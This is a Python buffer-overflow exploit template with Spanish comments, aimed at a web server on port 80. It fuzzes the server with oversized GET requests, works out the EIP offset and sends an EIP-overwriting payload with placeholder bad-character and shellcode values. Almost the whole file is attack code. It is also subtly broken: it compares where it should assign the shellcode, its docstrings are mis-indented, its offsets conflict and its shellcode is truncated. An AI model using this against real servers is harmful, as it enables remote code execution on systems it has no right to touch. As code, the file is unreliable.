from struct import pack
import socket, sys

# --- Variables ---

ip_address = "192.168.1.23" # < poner tu ip correspondiente
port = 80

OFFSET_EIP = 1787 # -> Cantidad de bytes para llegar al EIP (obtenido con la funcion detect_offset_eip)


before_eip = b'A'*OFFSET_EIP
eip= b'B'*4

payload = before_eip + eip + b'C'*500

badchars = (b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f") # esto es a modo de ejemplo, se deben agregar todos los badchars detectados

shellcode == b"\xb8\x1d\x7e\x3f\x1e\xda\xd6\xd9\x74\x24\xf4\x5a\x31\xc9\xb1" # Shellcode de ejemplo

# -- Funciones ---
def fuzzing():
"""
    Fuzzing para detectar el offset del EIP
"""

    longitud = 1000

    while True:
        try:
            buffer = b"A" * longitud    # \x41 es el valor en hexadecimal de "A"

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # para habilitar una conexion TCP
            s.connect((ip_address, port))
            
            s.send(b"GET /" + buffer + b" HTTP/1.1\r\n\r\n")
            s.close()
           
            longitud += 100
        except:
            print(f"Fuzzing crash con {longitud} bytes")
            sys.exit(1)


def detect_offset_eip():
"""
    Detectar el offset del EIP
"""
    payload = b"A" * 2606 + b"B" * 4 + b"C" * (3500 - 2606 - 4)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # para habilitar una conexion TCP
    s.connect((ip_address, port))
    s.send(b"GET /" + payload + b" HTTP/1.1\r\n\r\n")
    s.recv(1024)                                            # esto es para recibir la respuesta del servidor
    s.close()

    

def exploit():
    
    # fuzzing()
    # detect_offset_eip()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # para habilitar una conexion TCP 
    s.connect((ip_address, port))
    s.send(b"GET /" + payload + b" HTTP/1.1\r\n\r\n")
    s.recv(1024)                                            # esto es para recibir la respuesta del servidor
    s.close()



if __name__ == '__main__':
    exploit()
